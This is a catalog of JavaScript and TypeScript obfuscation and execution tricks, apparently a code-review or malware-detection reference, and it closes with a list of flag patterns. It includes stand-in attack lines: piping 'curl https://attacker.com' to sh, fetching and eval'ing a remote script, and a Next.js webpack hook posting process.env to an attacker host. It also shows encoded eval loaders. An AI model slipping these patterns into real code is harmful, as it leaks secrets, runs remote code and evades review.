# JavaScript/TypeScript Obfuscation Catalog

## Execution Primitives

| Primitive | Risk | Notes |
|-----------|------|-------|
| `eval(code)` | RCE | Direct execution |
| `new Function(code)()` | RCE | Creates anonymous function |
| `Function(code)()` | RCE | Same without `new` |
| `setTimeout(code, ms)` | RCE | String argument = eval |
| `setInterval(code, ms)` | RCE | String argument = eval |
| `import(url)` | Code loading | Dynamic import of arbitrary module |
| `require(path)` | Code loading | Node.js dynamic require |
| `vm.runInContext(code)` | RCE | Node.js VM module |
| `child_process.exec(cmd)` | RCE | Shell execution |
| `child_process.spawn(cmd)` | RCE | Process spawning |
| `Worker(blob_url)` | RCE | Web Worker from Blob |

## Indirect eval Techniques

```javascript
// Variable aliasing
const e = eval; e("payload")

// Property access
window["eval"]("payload")
globalThis["eval"]("payload")
this["eval"]("payload")

// Computed property
const fn = "ev" + "al"; window[fn]("payload")

// Comma operator (indirect eval has global scope)
(0, eval)("payload")
(1, eval)("payload")

// Template literal
eval`payload`

// Reflect
Reflect.apply(eval, null, ["payload"])

// Array method abuse
["payload"].forEach(eval)
["payload"].map(eval)

// Prototype chain
"".constructor.constructor("payload")()
[].constructor.constructor("payload")()
({}).constructor.constructor("payload")()

// Symbol.toPrimitive abuse
const obj = { [Symbol.toPrimitive]: () => "payload" }
eval(obj)
```

## Dynamic Import Abuse

```javascript
// Data URI
import("data:text/javascript,export default " + payload)

// Blob URL
const blob = new Blob([code], {type: 'text/javascript'})
import(URL.createObjectURL(blob))

// Fetch + eval (Node.js)
fetch("https://attacker.com/payload.js").then(r => r.text()).then(eval)

// require with variable
const pkg = "mal" + "icious"
require(pkg)

// Module constructor (Node.js internals)
const m = new module.constructor()
m._compile(code, "fake.js")
```

## Node.js Specific Patterns

```javascript
// child_process with obfuscated command
const cp = require("child_" + "process")
cp["exe" + "c"]("curl https://attacker.com | sh")

// Process binding (low-level)
process.binding("spawn_sync").spawn({file: "/bin/sh", args: ["-c", "payload"]})

// vm module
const vm = require("vm")
vm.runInNewContext("payload", {require})

// WASI (WebAssembly System Interface)
const { WASI } = require("wasi")
// Can execute arbitrary system calls via wasm
```

## Encoding Patterns

```javascript
// Base64
eval(atob("cGF5bG9hZA=="))
eval(Buffer.from("cGF5bG9hZA==", "base64").toString())

// Hex
eval(Buffer.from("7061796c6f6164", "hex").toString())

// Char codes
eval(String.fromCharCode(112,97,121,108,111,97,100))

// Unicode escapes
eval("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")

// URL encoding
eval(decodeURIComponent("%70%61%79%6c%6f%61%64"))

// Reverse
eval("daolayp".split("").reverse().join(""))

// XOR
const key = 42
const encoded = [90, 75, 93, 78, 77, 75, 70]
eval(encoded.map(c => String.fromCharCode(c ^ key)).join(""))
```

## Build-Time / Config Injection (Next.js Specific)

```javascript
// next.config.js — environment variable exfiltration
module.exports = {
  env: {
    // This gets inlined into client bundle!
    SECRET: process.env.DATABASE_URL  // LEAKED TO CLIENT
  },
  
  // Webpack plugin injection
  webpack: (config) => {
    config.plugins.push({
      apply: (compiler) => {
        compiler.hooks.done.tap("exfil", () => {
          fetch("https://attacker.com", {
            method: "POST",
            body: JSON.stringify(process.env)
          })
        })
      }
    })
    return config
  }
}
```

```javascript
// Trojanized library in node_modules (e.g., jquery.min.js)
// Legitimate jQuery code...
;(function(){eval(atob("bWFsaWNpb3VzIHBheWxvYWQ="))})()
// More legitimate jQuery code...
```

## TypeScript-Specific Risks

```typescript
// Type assertion to bypass type checking
const fn = eval as unknown as (code: string) => void
fn("payload")

// Declaration merging to shadow safe types
declare global {
  interface Window {
    safeFunction: (code: string) => void  // Actually eval
  }
}
window.safeFunction = eval

// Const assertion abuse
const config = {
  handler: "eval",
  code: "payload"
} as const
;(globalThis as any)[config.handler](config.code)
```

## Detection Quick Reference

### Must-flag patterns (immediate review)
- Any `eval(`, `new Function(`, `Function(`
- `require()` or `import()` with variable/concatenated argument
- `child_process` usage
- `process.binding`
- `vm.runIn*`
- `atob()` or `Buffer.from()` whose result flows to execution
- `String.fromCharCode()` building strings from number arrays
- `setTimeout`/`setInterval` with string first argument

### Suspicious patterns (deeper review needed)
- Property access via string concatenation: `obj["ev" + "al"]`
- `Reflect.apply` on execution functions
- Prototype chain navigation: `.constructor.constructor`
- `globalThis`, `window`, `global` with computed property access
- `URL.createObjectURL` + `Blob` with text/javascript
- Webpack plugins in next.config.js that make network calls
- Dynamic `require()` in postinstall scripts
